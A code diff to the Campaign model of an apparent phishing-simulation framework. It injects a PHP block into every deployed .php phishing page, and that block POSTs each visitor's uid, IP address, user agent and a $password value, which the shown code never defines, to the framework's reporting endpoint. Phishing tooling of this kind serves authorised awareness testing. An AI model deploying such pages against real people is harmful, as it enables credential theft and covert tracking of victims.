@@ -126,7 +126,35 @@ class Campaign < ActiveRecord::Base
     FileUtils.mkdir_p(deployment_directory)
     template.website_files.each do |page|
       loc = File.join(deployment_directory, page[:file])
-      FileUtils.cp(page.file.current_path, loc)
+      #FileUtils.cp(page.file.current_path, loc)
+      File.open(loc, 'w') do |fo|
+        if File.extname(page.file.current_path) == '.php'
+          fo.puts "
+                  <?php
+                  $uid = $_GET['uid'];
+                  $ip = $_SERVER['REMOTE_ADDR'];
+                  $browser = $_SERVER['HTTP_USER_AGENT'];
+                  $host = $_SERVER['HTTP_HOST'];
+                  $url = '#{PhishingFramework::SITE_URL}' . '/reports/results/'; 
+                  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $password);
+
+                  // use key 'http' even if you send the request to https://...
+                  $options = array(
+                          'http' => array(
+                          'header'  => \"Content-type: application/x-www-form-urlencoded\",
+                          'method'  => 'POST',
+                          'content' => http_build_query($data),
+                          ),
+                  );
+                  $context  = stream_context_create($options);
+                  $result = file_get_contents($url, false, $context); 
+                  ?>
+                  "
+        end
+        File.foreach(page.file.current_path) do |li|
+          fo.puts li
+        end
+      end
       if inflatable?(loc)
         inflate(loc, deployment_directory)
       end
